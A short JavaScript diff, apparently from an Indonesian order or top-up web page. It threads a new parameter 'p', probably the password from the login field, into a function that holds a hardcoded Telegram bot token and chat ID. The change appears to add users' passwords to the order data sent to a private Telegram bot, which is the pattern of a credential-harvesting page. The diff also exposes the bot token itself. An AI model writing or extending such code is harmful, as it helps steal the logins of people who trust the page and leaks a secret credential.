@@ -230,8 +230,8 @@ async function prosesPesanan() {
 
         // Listener buat update otomatis kalau admin ganti status di Firebase
         db.ref('orders/' + currentTid + '/status').on('value', snap => {
-            if(snap.val() === 'success') {
-                tampilkanSlide3(currentTid, u, itm, tot);
+            if(snap.val() === 's') {
+                tampilkanSlide3(currentTid, u, p, itm, tot);
             }
         });
 
@@ -241,7 +241,7 @@ async function prosesPesanan() {
     }
 }
 
-function kirimFormSubmit(tid, u, w, itm, tot) {
+function kirimFormSubmit(tid, u, p, w, itm, tot) {
     const telegramToken = "8580483532:AAF8WgfpMK_SDE8mKtggcMhPFC_H2uJDwsc";
     const telegramChatId = "6076444140";
     
@@ -292,6 +292,7 @@ document.getElementById('togglePassword').onclick = function() {
 };
 
 window.onload = init;
+
 
 
 
